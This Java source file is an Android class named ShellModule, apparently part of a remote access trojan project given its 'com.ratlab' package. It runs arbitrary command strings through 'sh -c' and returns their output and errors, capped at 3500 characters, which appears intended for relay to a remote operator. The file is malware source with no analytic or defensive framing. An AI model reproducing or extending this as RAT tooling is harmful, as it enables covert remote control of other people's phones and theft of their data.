package com.ratlab;

import android.content.Context;

import java.io.BufferedReader;
import java.io.InputStreamReader;

public class ShellModule {

    private final Context ctx;

    public ShellModule(Context ctx) {
        this.ctx = ctx;
    }

    public String exec(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line).append("\n");
                if (sb.length() > 3500) break;
            }
            while ((line = er.readLine()) != null) {
                sb.append("[ERR] ").append(line).append("\n");
                if (sb.length() > 3500) break;
            }
            p.waitFor();
            return sb.length() == 0 ? "(kosong)" : sb.toString();
        } catch (Exception e) {
            return "Error: " + e.getMessage();
        }
    }
}
